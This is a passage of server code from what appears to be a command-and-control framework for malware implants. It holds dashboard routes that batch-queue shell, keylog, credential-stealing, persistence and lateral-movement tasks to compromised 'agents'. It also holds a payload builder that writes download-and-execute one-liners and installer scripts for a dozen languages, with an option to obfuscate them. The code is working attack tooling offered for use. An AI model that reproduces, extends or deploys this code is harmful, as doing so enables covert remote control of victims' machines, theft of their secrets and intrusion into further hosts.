            "UPDATE agents SET note = ?, note_by = ? WHERE id = ?",
            (note.strip(), user, agent_id),
        )
        conn.commit()
    finally:
        conn.close()
    return RedirectResponse(f"/agents/{agent_id}", status_code=303)


@app.post("/tasks/{task_id}/requeue", include_in_schema=False)
async def requeue_task(request: Request, task_id: str):
    """Manually re-queue a 'sent' or 'failed' task (e.g. agent died)."""
    user = get_current_user(request)
    if not user:
        return login_redirect()
    conn = get_conn()
    try:
        row = conn.execute("SELECT agent_id FROM tasks WHERE id = ?", (task_id,)).fetchone()
        if row is not None:
            conn.execute(
                "UPDATE tasks SET status='pending', sent_at=NULL, result=NULL, exit_code=NULL "
                "WHERE id=? AND status IN ('sent','failed')",
                (task_id,),
            )
            conn.commit()
    finally:
        conn.close()
    if row is None:
        raise HTTPException(status_code=404, detail="task not found")
    return RedirectResponse(f"/agents/{row['agent_id']}", status_code=303)


@app.post("/agents/{agent_id}/note/delete", include_in_schema=False)
async def delete_agent_note(request: Request, agent_id: str):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    conn = get_conn()
    try:
        conn.execute("UPDATE agents SET note = '', note_by = '' WHERE id = ?", (agent_id,))
        conn.commit()
    finally:
        conn.close()
    return RedirectResponse(f"/agents/{agent_id}", status_code=303)


@app.post("/api/batch/tasks", include_in_schema=False)
async def batch_create_tasks(request: Request):
    """Queue a task to multiple agents at once."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    data = await request.json()
    agent_ids = data.get("agent_ids", [])
    task_type = data.get("task_type", "")
    payload = data.get("payload", "")
    timeout_val = data.get("timeout", "")
    destination = data.get("destination", "")
    if task_type not in ALLOWED_TASK_TYPES:
        raise HTTPException(status_code=400, detail=f"invalid task type: {task_type}")
    if task_type in ("keylog", "clipboard", "clone"):
        raise HTTPException(status_code=400, detail=f"{task_type} cannot be batch-queued")

    if task_type == "shell":
        args = {"command": payload}
        try:
            t = int(timeout_val)
            if t >= 1:
                args["timeout"] = min(t, 3600)
        except ValueError:
            pass
    elif task_type == "download":
        args = {"file": Path(payload).name if payload else "payload.bin"}
        if destination.strip():
            args["destination"] = destination.strip()
    elif task_type == "upload":
        args = {"path": payload}
    elif task_type == "sleep":
        try:
            args = {"seconds": max(1, int(payload))}
        except ValueError:
            args = {"seconds": 10}
    elif task_type == "screenshot":
        name = (payload or "").strip()
        args = {"name": name} if name else {}
    elif task_type == "steal":
        args = {"profile": _steal_profile(payload)}
    elif task_type == "persistence":
        args = {}
    elif task_type == "lateral":
        args = {"subnet": _lateral_subnet(payload)}
    else:
        args = {}

    created = 0
    created_tasks = []
    conn = get_conn()
    try:
        for aid in agent_ids:
            row = conn.execute("SELECT id, hostname FROM agents WHERE id = ?", (aid,)).fetchone()
            if row is None:
                continue
            task_id = uuid.uuid4().hex
            conn.execute(
                "INSERT INTO tasks (id, agent_id, type, args, created_at) VALUES (?,?,?,?,?)",
                (task_id, aid, task_type, json.dumps(args), utcnow()),
            )
            created_tasks.append({"task_id": task_id, "agent_id": aid, "hostname": row["hostname"]})
            created += 1
        conn.commit()
    finally:
        conn.close()
    return {"ok": True, "created": created, "tasks": created_tasks}


@app.post("/api/batch/tasks/status", include_in_schema=False)
async def batch_task_status(request: Request):
    """Return current status/output for a list of task ids (for batch result popup)."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    data = await request.json()
    task_ids = data.get("task_ids", [])
    if not task_ids:
        return {"tasks": []}
    placeholders = ",".join("?" for _ in task_ids)
    conn = get_conn()
    try:
        rows = conn.execute(
            f"""SELECT t.id, t.agent_id, a.hostname, t.type, t.status,
                       t.args, t.result, t.exit_code, t.created_at, t.completed_at
                FROM tasks t LEFT JOIN agents a ON a.id = t.agent_id
                WHERE t.id IN ({placeholders})""",
            tuple(task_ids),
        ).fetchall()
        return {"tasks": [dict(r) for r in rows]}
    finally:
        conn.close()


@app.post("/api/batch/agents/delete", include_in_schema=False)
async def batch_delete_agents(request: Request):
    """Delete multiple agents (and their tasks + collected files) at once."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    data = await request.json()
    agent_ids = data.get("agent_ids", [])
    if not isinstance(agent_ids, list) or not agent_ids:
        raise HTTPException(status_code=400, detail="no agent ids provided")

    conn = get_conn()
    deleted = []
    try:
        for aid in agent_ids:
            row = conn.execute("SELECT id, hostname FROM agents WHERE id = ?", (aid,)).fetchone()
            if row is None:
                continue
            conn.execute("DELETE FROM tasks WHERE agent_id = ?", (aid,))
            conn.execute("DELETE FROM agents WHERE id = ?", (aid,))
            deleted.append({"agent_id": aid, "hostname": row["hostname"]})
        conn.commit()
    finally:
        conn.close()

    for aid in agent_ids:
        for f in COLLECTED_DIR.glob(f"{aid}__*"):
            try:
                f.unlink()
            except OSError:
                pass

    log.info("batch delete: %d agent(s) removed by %s", len(deleted), user)
    return {"ok": True, "deleted": len(deleted), "agents": deleted}


@app.get("/api/server-info")
async def api_server_info(request: Request):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    return {"host": str(request.base_url).rstrip("/"), "platform": sys.platform}


# --------------------------------------------------------------------------
# Agent generator (payload builder)
# --------------------------------------------------------------------------

def _build_agent_command(language: str, server: str, token: str,
                         interval: int, jitter: float, verbose: bool,
                         build_on_server: bool = False,
                         target: str = "win_x64",
                         shell_os: str = "windows") -> str:
    """Build one-liner download+execute command for the target shell OS."""
    v = " --verbose" if verbose else ""
    j = f" --jitter {jitter}" if jitter > 0 else ""
    flags = f" --server {server} --interval {interval}{j}{v}"
    dl_build = f"{server}/download/build/{language}?target={target}&token={token}"
    dl_src = f"{server}/download/agent/{language}?token={token}"

    def _compiled_cmd(build_dl, ext):
        if shell_os == "windows":
            return (
                f"curl.exe -sL \"{build_dl}\" -o \"$env:TEMP\\agent{ext}\"; "
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"& \"$env:TEMP\\agent{ext}\"{flags}"
            )
        if shell_os == "cmd":
            return (
                f"curl.exe -sL \"{build_dl}\" -o \"%TEMP%\\agent{ext}\""
                f" && set \"C2_SERVER={server}\" && set \"C2_TOKEN={token}\""
                f" && \"%TEMP%\\agent{ext}\"{flags}"
            )
        return (
            f"curl -sL {build_dl} -o /tmp/agent && chmod +x /tmp/agent && "
            f"C2_SERVER={server} C2_TOKEN={token} /tmp/agent{flags}"
        )

    if build_on_server and language in COMPILED_LANGUAGES:
        if language == "java":
            jar = f"{server}/download/build/java?target={target}&token={token}"
            if shell_os == "windows":
                return (
                    f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                    f"curl.exe -sL \"{jar}\" -o \"$env:TEMP\\c2agent_java.jar\"; "
                    f"java.exe -jar \"$env:TEMP\\c2agent_java.jar\"{flags}"
                )
            if shell_os == "cmd":
                return (
                    f"curl.exe -sL \"{jar}\" -o \"%TEMP%\\c2agent_java.jar\""
                    f" && set \"C2_SERVER={server}\" && set \"C2_TOKEN={token}\""
                    f" && java -jar \"%TEMP%\\c2agent_java.jar\"{flags}"
                )
            return (
                f"curl -sL {jar} -o /tmp/c2agent_java.jar && "
                f"C2_SERVER={server} C2_TOKEN={token} java -jar /tmp/c2agent_java.jar{flags}"
            )
        t = BUILD_TARGETS.get(target, {})
        ext = t.get("ext", "")
        return _compiled_cmd(dl_build, ext)

    if shell_os in ("windows", "cmd"):
        in_cmd = shell_os == "cmd"
        q = "%TEMP%" if in_cmd else "$env:TEMP"
        envset = (
            (f"set \"C2_SERVER={server}\" && set \"C2_TOKEN={token}\" && ")
            if in_cmd else
            (f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; ")
        )
        if in_cmd:
            builds = {
                "python": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.py\""
                    f" && python.exe \"{q}\\agent.py\"{flags}"
                ),
                "go": (
                    f"{envset}go build -o \"{q}\\agent.exe\" {dl_src}"
                    f" && \"{q}\\agent.exe\"{flags}"
                ),
                "csharp": (
                    f"{envset}dotnet build {q}\\a -o {q}\\out -q"
                    f" && \"{q}\\out\\a.exe\"{flags}"
                ),
                "rust": (
                    f"{envset}cargo build --release"
                    f" && .\\target\\release\\c2agent.exe{flags}"
                ),
                "c": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.c\""
                    f" && gcc -o \"{q}\\agent.exe\" \"{q}\\agent.c\" -lcurl"
                    f" && \"{q}\\agent.exe\"{flags}"
                ),
                "cpp": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.cpp\""
                    f" && g++ -o \"{q}\\agent.exe\" \"{q}\\agent.cpp\" -lcurl"
                    f" && \"{q}\\agent.exe\"{flags}"
                ),
                "powershell": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.ps1\""
                    f" && powershell -NoProfile -ExecutionPolicy Bypass -File \"{q}\\agent.ps1\""
                    f"{flags}"
                ),
                "bash": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.sh\""
                    f" && bash \"{q}\\agent.sh\"{flags}"
                ),
                "nodejs": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.js\""
                    f" && node.exe \"{q}\\agent.js\"{flags}"
                ),
                "lua": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.lua\""
                    f" && lua \"{q}\\agent.lua\"{flags}"
                ),
                "php": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.php\""
                    f" && php.exe \"{q}\\agent.php\"{flags}"
                ),
                "ruby": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.rb\""
                    f" && ruby.exe \"{q}\\agent.rb\"{flags}"
                ),
                "perl": (
                    f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.pl\""
                    f" && perl.exe \"{q}\\agent.pl\"{flags}"
                ),
            }
        else:
            builds = {
            "python": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"$p=\"$env:TEMP\\agent.py\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; python.exe $p{flags}"
            ),
            "go": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"go build -o $env:TEMP\\agent.exe {dl_src}; & $env:TEMP\\agent.exe{flags}"
            ),
            "csharp": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"curl.exe -sL '{dl_src}' -o $env:TEMP\\agent.cs; "
                f"dotnet new console -o $env:TEMP\\a --force; "
                f"Copy-Item $env:TEMP\\agent.cs $env:TEMP\\a\\Program.cs; "
                f"dotnet build $env:TEMP\\a -o $env:TEMP\\out -q; & $env:TEMP\\out\\a.exe{flags}"
            ),
            "rust": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"cargo build --release; & .\\target\\release\\c2agent.exe{flags}"
            ),
            "c": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"curl.exe -sL '{dl_src}' -o $env:TEMP\\agent.c; "
                f"gcc -o $env:TEMP\\agent.exe $env:TEMP\\agent.c -lcurl; "
                f"& $env:TEMP\\agent.exe{flags}"
            ),
            "cpp": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"curl.exe -sL '{dl_src}' -o $env:TEMP\\agent.cpp; "
                f"g++ -o $env:TEMP\\agent.exe $env:TEMP\\agent.cpp -lcurl; "
                f"& $env:TEMP\\agent.exe{flags}"
            ),
            "powershell": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"$p=\"$env:TEMP\\agent.ps1\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; & $p{flags}"
            ),
            "bash": (
                f"C2_SERVER={server} C2_TOKEN={token} bash <(curl -s {dl_src}){flags}"
            ),
            "nodejs": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"$p=\"$env:TEMP\\agent.js\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; node.exe $p{flags}"
            ),
            "lua": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"$p=\"$env:TEMP\\agent.lua\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; lua $p{flags}"
            ),
            "php": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"$p=\"$env:TEMP\\agent.php\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; php.exe $p{flags}"
            ),
            "ruby": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"$p=\"$env:TEMP\\agent.rb\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; ruby.exe $p{flags}"
            ),
            "perl": (
                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
                f"$p=\"$env:TEMP\\agent.pl\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; perl.exe $p{flags}"
            ),
        }
        return builds.get(language, builds["python"])

    # ── Linux / Darwin (bash/zsh) ──────────────────────────────
    builds = {
        "python": (
            f"C2_SERVER={server} C2_TOKEN={token} python3 -c "
            f"\"exec(__import__('urllib.request').urlopen('{dl_src}').read())\""
        ),
        "go": (
            f"C2_SERVER={server} C2_TOKEN={token} go run {dl_src}{flags}"
        ),
        "csharp": (
            f"# .NET SDK required\n"
            f"C2_SERVER={server} C2_TOKEN={token} dotnet script {dl_src}{flags}"
        ),
        "rust": (
            f"C2_SERVER={server} C2_TOKEN={token} cargo run --release{flags}"
        ),
        "c": (
            f"# requires gcc + libcurl-dev\n"
            f"C2_SERVER={server} C2_TOKEN={token} "
            f"gcc -o /tmp/agent {dl_src} -lcurl && /tmp/agent{flags}"
        ),
        "cpp": (
            f"# requires g++ + libcurl-dev\n"
            f"C2_SERVER={server} C2_TOKEN={token} "
            f"g++ -o /tmp/agent {dl_src} -lcurl && /tmp/agent{flags}"
        ),
        "powershell": (
            f"C2_SERVER={server} C2_TOKEN={token} pwsh -c \"$(irm '{dl_src}')\"{flags}"
        ),
        "bash": (
            f"C2_SERVER={server} C2_TOKEN={token} bash <(curl -s {dl_src}){flags}"
        ),
        "nodejs": (
            f"C2_SERVER={server} C2_TOKEN={token} node <(curl -s {dl_src}){flags}"
        ),
        "lua": (
            f"C2_SERVER={server} C2_TOKEN={token} lua <(curl -s {dl_src}){flags}"
        ),
        "php": (
            f"C2_SERVER={server} C2_TOKEN={token} php <(curl -s {dl_src}){flags}"
        ),
        "ruby": (
            f"C2_SERVER={server} C2_TOKEN={token} ruby <(curl -s {dl_src}){flags}"
        ),
        "perl": (
            f"C2_SERVER={server} C2_TOKEN={token} perl <(curl -s {dl_src}){flags}"
        ),
    }
    return builds.get(language, builds["python"])


@app.get("/generate", include_in_schema=False)
async def generate_page(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    default_server = str(request.base_url).rstrip("/")
    return templates.TemplateResponse(
        request,
        "generate.html",
        {"user": user, "generated": None, "default_server": default_server},
    )


@app.post("/generate", include_in_schema=False)
def generate_post(
    request: Request,
    language: str = Form("python"),
    server: str = Form(""),
    token: str = Form(""),
    interval: int = Form(10),
    jitter: float = Form(0.0),
    verbose: str = Form(""),
    build_on_server: str = Form(""),
    target: str = Form("win_x64"),
    shell_os: str = Form("windows"),
    obfuscate: str = Form(""),
    ext: str = Form(""),
):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    server = server.strip().rstrip("/") or str(request.base_url).rstrip("/")
    effective_token = token.strip() if token.strip() else app.state.agent_token

    # If build_on_server, trigger build first. Runs on a worker thread so a long
    # cross-compile never freezes the event loop / dashboard.
    binary_ready = False
    gen_build_error = ""
    if build_on_server == "on" and language in COMPILED_LANGUAGES:
        path, err = _build_binary(language, target)
        if not err:
            binary_ready = True
        else:
            gen_build_error = err

    eff_interval = max(1, interval)
    eff_jitter = max(0.0, jitter)
    eff_verbose = verbose == "on"

    installer_shell, payload_kind = _normalize_payload(shell_os)

    # C# agents run on .NET, which is not available on Linux/macOS targets; a
    # Unix payload would only ever produce a dotnet-script one-liner that can
    # not run there, so C# stays Windows-only end to end.
    if language == "csharp" and installer_shell != "windows":
        raise HTTPException(status_code=400,
            detail="C# agents require .NET -- only Windows payloads/targets are supported")

    # Compact payload + viewable installer source (config embedded).
    # Every config value (server, token, interval, jitter, verbose, shell OS)
    # is baked into the installer script body. The rendered body is stored so
    # the public payload URL can stay completely clean (zero query params) and
    # still return the exact same script when executed on the target host.
    installer_source = _build_installer(
        language=language,
        server=server,
        token=effective_token,
        interval=eff_interval,
        jitter=eff_jitter,
        verbose=eff_verbose,
        target=target,
        shell_os=installer_shell,
        build_on_server=binary_ready,
        ext=ext,
    )
    # Store the body per language+server on the matching shell route so the
    # clean /agent/{lang}/installer.{sh,ps1} endpoints can serve it. When the
    # obfuscate toggle is on, what gets stored (and served / viewed) is the
    # decrypt-and-run stub + ciphertext, never the plaintext body.
    if obfuscate == "on":
        if installer_shell == "windows":
            installer_source = _obfuscate_ps(installer_source, server, effective_token)
        else:
            installer_source = _obfuscate_sh(installer_source, server, effective_token)
    if installer_shell == "windows":
        _installer_ps[(language, server)] = installer_source
        install_url = f"{server}/agent/{language}/installer.ps1"
    else:
        _installer_sh[(language, server)] = installer_source
        install_url = f"{server}/agent/{language}/installer.sh"
    command = _payload_oneliner(payload_kind, install_url)

    return templates.TemplateResponse(
        request,
        "generate.html",
        {
            "user": user,
            "generated": command,
            "default_server": str(request.base_url).rstrip("/"),
            "gen_language": language,
            "gen_server": server,
            "gen_token": token.strip(),
            "gen_interval": interval,
            "gen_jitter": jitter,
            "gen_verbose": eff_verbose,
            "gen_build_server": build_on_server == "on",
            "gen_target": target,
            "gen_shell_os": shell_os,
            "gen_obfuscate": obfuscate == "on",
            "gen_installer_hash": hashlib.sha256(installer_source.encode()).hexdigest(),
            "installer_source": installer_source,
            "gen_build_error": gen_build_error,
            "gen_ext": ext,
        },
    )


# --------------------------------------------------------------------------
# Agent download (source files + one-liner)
# --------------------------------------------------------------------------

AGENT_FILES = {
    "python":     ("agent.py",    "text/x-python"),
    "go":         ("agent.go",    "text/x-go"),
    "csharp":     ("agent.cs",    "text/x-csharp"),
    "rust":       ("agent.rs",    "text/x-rust"),
    "powershell": ("agent.ps1",   "text/plain"),
    "bash":       ("agent.sh",    "text/x-shellscript"),
    "lua":        ("agent.lua",   "text/x-lua"),
    "nodejs":     ("agent.js",    "text/javascript"),
    "php":        ("agent.php",   "text/x-php"),
    "ruby":       ("agent.rb",    "text/x-ruby"),
    "perl":       ("agent.pl",    "text/x-perl"),
    "c":          ("agent.c",     "text/x-c"),
    "cpp":        ("agent.cpp",   "text/x-c++src"),
    "java":       ("agent.java",  "text/x-java"),
}

COMPILED_LANGUAGES = {"go", "csharp", "rust", "c", "cpp", "java"}
INTERPRETED_LANGUAGES = set(AGENT_FILES.keys()) - COMPILED_LANGUAGES


@app.get("/download/agent/{language}", include_in_schema=False)
async def download_agent_source(request: Request, language: str, token: str = ""):
    user = get_current_user(request)
    if not user:
        hdr = request.headers.get("x-agent-token", "")
        tok = token or hdr
        expected = app.state.agent_token
        if not expected or not tok or not secrets.compare_digest(tok, expected):
            raise HTTPException(status_code=401, detail="authentication required")
    if language not in AGENT_FILES:
        raise HTTPException(status_code=404, detail="unknown language")
    filename, mimetype = AGENT_FILES[language]
    path = CLIENTS_DIR / filename
    if not path.is_file():
        raise HTTPException(status_code=404, detail="agent file not found")
    return FileResponse(path, media_type=mimetype, filename=filename)


@app.get("/api/download/agent/{language}/oneliner")
async def api_agent_oneliner(request: Request, language: str, format: str = "json",
                             payload: str = ""):
    """Return a compact payload one-liner (curl|sh / wget / irm|iex).

    All configuration (server, token, interval) is embedded inside the
    installer script served by /download/agent/{language}/installer, so the
    one-liner stays short and contains no nested/escaped quotes.
    """
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if language not in AGENT_FILES:
        raise HTTPException(status_code=404, detail="unknown language")
    server = str(request.base_url).rstrip("/")
    token = app.state.agent_token
    installer_shell, payload_kind = _normalize_payload(payload or "win-irm")
    ext = "ps1" if installer_shell == "windows" else "sh"
    inst = f"{server}/agent/{language}/installer.{ext}"
    oneliner = _payload_oneliner(payload_kind, inst)
    if format == "raw":
        from fastapi.responses import PlainTextResponse
        return PlainTextResponse(oneliner)
    return {"oneliner": oneliner, "language": language, "installer": inst}


def _shell_quote(s):
    return "'" + s.replace("'", "'\\''") + "'"


def _build_installer(language: str, server: str, token: str, interval: int,
                     jitter: float = 0.0, verbose: bool = False,
                     target: str = "win_x64", shell_os: str = "windows",
                     build_on_server: bool = False, ext: str = "") -> str:
    """Produce a wrapper installer script with server/token/interval embedded.

    The returned script is what the compact payload one-liner downloads and
    executes (curl|sh on unix, irm|iex on windows). Everything the agent needs
    is baked in, keeping the public one-liner free of config and of nested
    quotes.

    For compiled languages, build_on_server=True swaps the "download source +
    compile on target" approach for "download the pre-built binary" so no
    toolchain is required on the target host.
    """
    opt = f"--interval {int(interval)}"
    if jitter > 0:
        opt += f" --jitter {jitter}"
    if verbose:
        opt += " --verbose"
    dl = f"{server}/download/agent/{language}?token={token}"
    # optional custom extension is respected for the downloaded filename
    ext_q = f"&ext={urllib.parse.quote(ext)}" if ext.strip() else ""
    dl_build = f"{server}/download/build/{language}?target={target}&token={token}{ext_q}"
    target_os = BUILD_TARGETS.get(target, {}).get("os", "windows")

    # ---- Unix installer (sh) -----------------------------------------------
    if shell_os in ("unix", "linux", "darwin", "bash", "sh"):
        S = _shell_quote(server)
        T = _shell_quote(token)
        fetch = f"curl -fsSL {_shell_quote(dl)} -o \"$AGENT\""
        dep = ""
        run = ""
        if language in ("python",):
            run = f"python3 \"$AGENT\" --server {S} --token {T} {opt}"
        elif language in ("nodejs",):
            run = f"node \"$AGENT\" --server {S} --token {T} {opt}"
        elif language in ("php",):
            run = f"php \"$AGENT\" --server {S} --token {T} {opt}"
        elif language in ("ruby",):
            run = f"ruby \"$AGENT\" --server {S} --token {T} {opt}"
        elif language in ("perl",):
            run = f"perl \"$AGENT\" --server {S} --token {T} {opt}"
        elif language in ("lua",):
            run = f"lua \"$AGENT\" --server {S} --token {T} {opt}"
        elif language == "bash":
            run = f"bash \"$AGENT\" --server {S} --token {T} {opt}"
        elif language == "powershell":
            run = f"pwsh -NoProfile -File \"$AGENT\" -Server {S} -Token {T} -Interval {int(interval)}"
            fetch = f"curl -fsSL {_shell_quote(dl)} -o \"$AGENT\""
        elif language == "java":
            if build_on_server:
                # Pre-built jar from server: fetch + java -jar.
                fetch = f"curl -fsSL {_shell_quote(dl_build)} -o \"$AGENT\""
                run = f"java -jar \"$AGENT\" --server {S} --token {T} {opt}"
            else:
                # JDK required on target; javac compiles into a private temp dir
                # so no .class files are left in the working directory.
                run = (
                    'J="$(mktemp -d ${TMPDIR:-/tmp}/c2j.XXXXXX)"; '
                    f"curl -fsSL {_shell_quote(dl)} -o \"$J/agent.java\" && "
                    f'javac -encoding UTF-8 -d "$J" "$J/agent.java" && '
                    f'java -cp "$J" Agent --server {S} --token {T} {opt}'
                )
        elif language in ("go", "rust", "csharp", "c", "cpp"):
            ext = ext or BUILD_TARGETS.get(target, {}).get("ext", "")
            out = _shell_quote(f"/tmp/c2agent{ext}")
            if build_on_server:
                # Pre-built binary from the server: just fetch + chmod + run.
                # No toolchain required on the target host.
                fetch = f"curl -fsSL {_shell_quote(dl_build)} -o \"$AGENT\" && chmod +x \"$AGENT\""
                run = f"\"$AGENT\" --server {S} --token {T} {opt}"
            else:
                dep = _compiled_dep_note(language)
                # compiled langs download+build inside `run`, so no separate fetch
                # (avoids downloading the source twice).
                fetch = ""
                if language == "go":
                    run = f"curl -fsSL {_shell_quote(dl)} -o \"$SRC\" && go build -o {out} \"$SRC\" && {out} --server {S} --token {T} {opt}"
                elif language == "rust":
                    # Needs cargo, not bare rustc: agent.rs pulls crates (reqwest,
                    # serde, rdev). Scaffold a temp crate and build it.
                    run = (
                        f'curl -fsSL {_shell_quote(dl)} -o "$SRC" && '
                        'D="$(mktemp -d ${TMPDIR:-/tmp}/c2rs.XXXXXX)" && '
                        'mv "$SRC" "$D/agent.rs" && cd "$D" && '
                        "cat > Cargo.toml <<'RSCF'\n"
                        "[package]\n"
                        'name = "c2agent"\n'
                        'version = "0.1.0"\n'
                        'edition = "2021"\n'
                        "\n"
                        "[[bin]]\n"
                        'name = "c2agent"\n'
                        'path = "agent.rs"\n'
                        "\n"
                        "[dependencies]\n"
                        'reqwest = { version = "0.12", features = ["blocking", "json", "multipart"] }\n'
                        'serde = { version = "1", features = ["derive"] }\n'
                        'serde_json = "1"\n'
                        'hostname = "0.4"\n'
                        'rdev = { version = "0.5", features = ["unstable_grab"] }\n'
                        "RSCF\n"
                        f"cargo build --release && ./target/release/c2agent --server {S} --token {T} {opt}"
                    )
                elif language in ("c", "cpp"):
                    cc = "g++" if language == "cpp" else "gcc"
                    run = f"curl -fsSL {_shell_quote(dl)} -o \"$SRC\" && {cc} -O2 -o {out} \"$SRC\" -lcurl && {out} --server {S} --token {T} {opt}"
                else:  # csharp
                    run = f"curl -fsSL {_shell_quote(dl)} -o \"$SRC\" && dotnet script \"$SRC\" -- --server {S} --token {T} {opt}"
        # Compiled languages download the source into "$SRC" with a real source
        # extension: gcc/g++ (and `go build`) otherwise treat an extension-less
        # file as an already-compiled object / module path and abort ("file
        # format not recognized; treating as linker script").
        src_ext = {
            "go": "go", "rust": "rs", "c": "c", "cpp": "cpp", "csharp": "cs",
        }.get(language, "src")
        script = (
            '#!/bin/sh\n'
            'AGENT="$(mktemp ${TMPDIR:-/tmp}/c2agent.XXXXXX)"\n'
            f'SRC="$AGENT.{src_ext}"\n'
            'trap \'rm -f "$AGENT" "$SRC"\' EXIT\n'
            + (f"{fetch}\n" if fetch else "")
            + (dep + "\n" if dep else "")
            + (f"{run}\n" if run else "# no runner defined for this language/OS\n")
        )
        return script

    # ---- Windows installer (PowerShell) ------------------------------------
    if shell_os in ("windows", "cmd", "powershell"):
        S = server.replace("'", "''")
        T = token.replace("'", "''")
        dl = dl.replace("'", "''")
        dlq = "'" + dl + "'"
        dl_build_q = "'" + dl_build.replace("'", "''") + "'"
        # URL fetched into $p: prebuilt binary for compiled+build-on-server,
        # otherwise the source script.
        fetch_src = dlq
        p_assign = f"\"$env:TEMP\\c2agent_{language}.{_agent_ext(language)}\""
        # LEGO the body using only single-quoted strings -> no nested double
        # quotes, hence no quote-escape issues when piped via irm | iex.
        run = ""
        if language in ("python",):
            run = f"& python.exe $p --server '{S}' --token '{T}' {opt}"
        elif language in ("nodejs",):
            run = f"& node.exe $p --server '{S}' --token '{T}' {opt}"
        elif language in ("php",):
            run = f"& php.exe $p --server '{S}' --token '{T}' {opt}"
        elif language in ("ruby",):
            run = f"& ruby.exe $p --server '{S}' --token '{T}' {opt}"
        elif language in ("perl",):
            run = f"& perl.exe $p --server '{S}' --token '{T}' {opt}"
        elif language in ("lua",):
            run = f"& lua.exe $p --server '{S}' --token '{T}' {opt}"
        elif language == "bash":
            run = f"& bash.exe $p --server '{S}' --token '{T}' {opt}"
        elif language == "powershell":
            run = f"& powershell -NoProfile -ExecutionPolicy Bypass -File $p -Server '{S}' -Token '{T}' -Interval {int(interval)}"
        elif language == "java":
            if build_on_server:
                p_assign = "\"$env:TEMP\\c2agent_java.jar\""
                fetch_src = dl_build_q
                run = f"& java -jar $p --server '{S}' --token '{T}' {opt}"
            else:
                # JDK required on target; drop .class into a private folder.
                p_assign = "\"$env:TEMP\\c2agent_java.java\""
                run = ("& javac.exe -encoding UTF-8 -d \"$env:TEMP\\c2j\" $p; "
                       f"& java -cp \"$env:TEMP\\c2j\" Agent --server '{S}' --token '{T}' {opt}")
        elif language in ("go", "rust", "csharp", "c", "cpp"):
            ext = ext or BUILD_TARGETS.get(target, {}).get("ext", ".exe")
            out = f"$env:TEMP\\c2agent{ext}"
            if build_on_server:
                # Pre-built binary from the server: just fetch + run. $p must be
                # the binary path (it holds the prebuilt artifact), not a source
                # path with a language extension.
                p_assign = f"\"$env:TEMP\\c2agent{ext}\""
                fetch_src = dl_build_q
                run = f"& $p --server '{S}' --token '{T}' {opt}"
            elif language == "go":
                run = f"& go build -o '{out}' $p; & '{out}' --server '{S}' --token '{T}' {opt}"
            elif language in ("c", "cpp"):
                cc = "g++" if language == "cpp" else "gcc"
                run = f"& {cc} -O2 -o '{out}' $p -lcurl; & '{out}' --server '{S}' --token '{T}' {opt}"
            elif language == "rust":
                run = f"& rustc -O -o '{out}' $p; & '{out}' --server '{S}' --token '{T}' {opt}"
            else:
                run = f"# .NET SDK required; run: dotnet script $p -- --server '{S}' --token '{T}' {opt}"
        script = (
            "$ProgressPreference='SilentlyContinue'\n"
            f"$p={p_assign}\n"
            f"[System.Net.WebClient]::new().DownloadFile({fetch_src}, $p)\n"
            f"{run}\n"
        )
        return script

    return "# unsupported shell_os"


def _agent_ext(language: str) -> str:
    return {"python": "py", "nodejs": "js", "php": "php", "ruby": "rb",
            "perl": "pl", "lua": "lua", "bash": "sh", "powershell": "ps1",
            "go": "go", "rust": "rs", "csharp": "cs", "c": "c", "cpp": "cpp",
            "java": "java"}.get(language, "txt")


def _compiled_dep_note(language: str) -> str:
    note = {"go": "go toolchain", "rust": "rustc", "csharp": ".NET SDK",
